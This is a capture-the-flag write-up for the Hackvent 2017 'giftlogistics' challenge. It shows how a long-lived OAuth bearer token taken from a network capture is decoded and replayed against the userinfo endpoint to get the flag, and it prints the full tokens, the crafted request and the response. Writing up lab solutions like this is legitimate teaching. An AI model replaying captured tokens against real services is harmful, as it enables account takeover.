Day 12: giftlogistics
=====================
> *countercomplete inmeasure*
> 
> Most passwords of Santa GiftLogistics were stolen. You find an example of the traffic for Santa's account with password and everything. The Elves CSIRT Team detected this and made sure that everyone changed their password.
> 
> Unfortunately this was an incomplete countermeasure. It's still possible to retrieve the protected user profile data where you will find the flag.

In this challenge we are given a network capture as well as a website that was compromised. The description also tells us that even though every password have been changed, there is still a way to access a user profile to find the flag.

In the PCAP file we see several HTTP exchanges with the website, including a login showing that openID is in use. In particular a GET request is done to `/giftlogistics/.well-known/openid-configuration`. This file includes some interesting information for later:
```
[CUT BY trolli101]
  "grant_types_supported": [
    "authorization_code",
    "implicit",
    "urn:ietf:params:oauth:grant-type:jwt-bearer",
    "client_credentials",
    "urn:ietf:params:oauth:grant_type:redelegate"
  ],
[CUT BY trolli101]
  "userinfo_endpoint": "http://challenges.hackvent.hacking-lab.com:7240/giftlogistics/userinfo",
[CUT BY trolli101]
```

JWT Bearer tokens are supported, let's keep this in mind. Also, the profile information is located at the URL shown above.

Exploring the PCAP further we have a POST request that shows a performed login, this is followed by a first and a second redirection. The second redirect goes to this URL:
```
http://transporter.hacking-lab.com/client#access_token=eyJraWQiOiJyc2ExIiwiYWxnIjoiUlMyNTYifQ.eyJzdWIiOiJzYW50YSIsImF6cCI6ImE3NWI0NzIyLTE0MWQtNGMwMC1iNjVjLTVkYzI3OTE0NmI2MCIsImlzcyI6Imh0dHA6XC9cL2NoYWxsZW5nZXMuaGFja3ZlbnQuaGFja2luZy1sYWIuY29tOjcyNDBcL2dpZnRsb2dpc3RpY3NcLyIsImV4cCI6MTUyNjkzNjkzNiwiaWF0IjoxNTExMzg0OTM2LCJqdGkiOiI4MTlmNWYzZC1hN2M3LTQ0YTktYmI5Ni0wZmQ4MmY0YjdlNzUifQ.U9Hv66701DtUb8zeqOo45JVbzC3yhKJhsQ_q7N20rdLn5-uovYzMWjhxY8I9oPQkv3s5iDDsx1GIUbnOkC8l__oj_uqptG0BPbRfD2K1blKpbXQt3yxD1pB63aHw5LRAp10ia0MNe8_eo-qzi9d58CVYY_XOtTRH8Ic_tP5lpXVaImi8miYFY2XqR1TuFM-cUjIMUYT9Ik8rwZAEbLO_1UAWPuQUpi0_Z6N0r3hKoIRSlknmmg8A5PunL2I0qFyICUm0cqb4fieBZ34R4117LmyQY_XvzKogIaLegDIgbp22hTGHPAdziEloYYaP5uc_aEnfo0eNvY7QLPNy1dDs-Q&token_type=Bearer&state=e6ec344ec594&expires_in=15551999&id_token=eyJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiUlNBMV81In0.AjFhnIaX-LLVpdJDMOvkK4MbTreuz3rdAwUfim8NsErrh238expG4O9tazr8gqZep9lCbHpieqiFRD8yRhF1-BA-EdmV9zO_Ilerrtfra1_AC5ozYV6wt1nK7cyzUm77mdpEzRZ9yhlMLrvk6FSh0lxlO6XwbJq6AL_KUsZza0kgsNVdUw3EsoAKYwZhVuzIgCLEQ1McRpEoCE9KESjKEgOgf0XoLZN-kqEARMujJH9OpCgIXIsR7ypew7Wp6W2cjWVkedjY2yaofOzedJyP7brZzX_zzPfCHey5dqW4TOlRaMlLaQ5sWIOcA2-HpsIJExoKXWRW0LIdJFS8VPKF4Q.WZtAImcXGL4EjUfw.1s2sKvRDX93EIL529djgN873OjnSXwdhB5FU5QKGt-8c0Qh-FijdssQ_6Mykgazydj8NyxCi0e5H1GogRCiv8ibchvwi4gXdQIeMXUIomHYyn2LuXS5lkARLqPzJIbv_j60NiEbdc1K9t8YuO_jnK1aajoNq2CIsgNRDxfIgbA7TZ8-GWU-Z1dItv2g7-3Ks9pwG2nUnmP0bqifYb9dae5bZe_oS5wBiHdQh43VQFPigY4G7r1dASpG3rnm_v6uqcET96dxN6AECwhW4SFQZKUoGlgv9JkG7HrUjoYbygmE1H3yrNBHQlRxnuWDxLWffsnpoGEVuZEBLyUxNA07t42NomgAdxWAlNvlrSd2veArpX2iEL_0K1u1oHe8_fkWfyWugqu39kuOeCGh2FULM0B-F8nzM6pQIN62uqwiJVJ0.0DDYtfSSe8eq10KFJ2agXw
```

In this URL we spot the `access_token` parameter, that's our Bearer token. This is confirmed by the next parameter `token_type=Bearer`. We can decode it using <https://jwt.io/> for instance. The decoded version (content only) is:
```json
{
  "sub": "santa",
  "azp": "a75b4722-141d-4c00-b65c-5dc279146b60",
  "iss": "http://challenges.hackvent.hacking-lab.com:7240/giftlogistics/",
  "exp": 1526936936,
  "iat": 1511384936,
  "jti": "819f5f3d-a7c7-44a9-bb96-0fd82f4b7e75"
}
```

Here the `exp` value is suspicious, converting this from a time stamp gives the following:
```
~/D/c/12 ❯❯❯ date -d @1526936936
Mon May 21 23:08:56 CEST 2018
```

So this is valid until May 2018 and since it is a Bearer token, no session is required on the server, the token is sufficient. This should be enough to access the user profile URL. Using Burp we can send the following HTTP request:
```
GET /giftlogistics/userinfo HTTP/1.1
Host: challenges.hackvent.hacking-lab.com:7240
Authorization: Bearer eyJraWQiOiJyc2ExIiwiYWxnIjoiUlMyNTYifQ.eyJzdWIiOiJzYW50YSIsImF6cCI6ImE3NWI0NzIyLTE0MWQtNGMwMC1iNjVjLTVkYzI3OTE0NmI2MCIsImlzcyI6Imh0dHA6XC9cL2NoYWxsZW5nZXMuaGFja3ZlbnQuaGFja2luZy1sYWIuY29tOjcyNDBcL2dpZnRsb2dpc3RpY3NcLyIsImV4cCI6MTUyNjkzNjkzNiwiaWF0IjoxNTExMzg0OTM2LCJqdGkiOiI4MTlmNWYzZC1hN2M3LTQ0YTktYmI5Ni0wZmQ4MmY0YjdlNzUifQ.U9Hv66701DtUb8zeqOo45JVbzC3yhKJhsQ_q7N20rdLn5-uovYzMWjhxY8I9oPQkv3s5iDDsx1GIUbnOkC8l__oj_uqptG0BPbRfD2K1blKpbXQt3yxD1pB63aHw5LRAp10ia0MNe8_eo-qzi9d58CVYY_XOtTRH8Ic_tP5lpXVaImi8miYFY2XqR1TuFM-cUjIMUYT9Ik8rwZAEbLO_1UAWPuQUpi0_Z6N0r3hKoIRSlknmmg8A5PunL2I0qFyICUm0cqb4fieBZ34R4117LmyQY_XvzKogIaLegDIgbp22hTGHPAdziEloYYaP5uc_aEnfo0eNvY7QLPNy1dDs-Q
```

As expected, the response includes the flag:
```
HTTP/1.1 200 OK
Server: Apache-Coyote/1.1
Access-Control-Allow-Origin: *
Content-Type: application/json;charset=ISO-8859-1
Content-Language: en
Content-Length: 98
Date: Tue, 12 Dec 2017 06:40:40 GMT
Connection: close

{"sub":"HV17-eUOF-mPJY-ruga-fUFq-EhOx","name":"Reginald Thumblewood","preferred_username":"santa"}
```
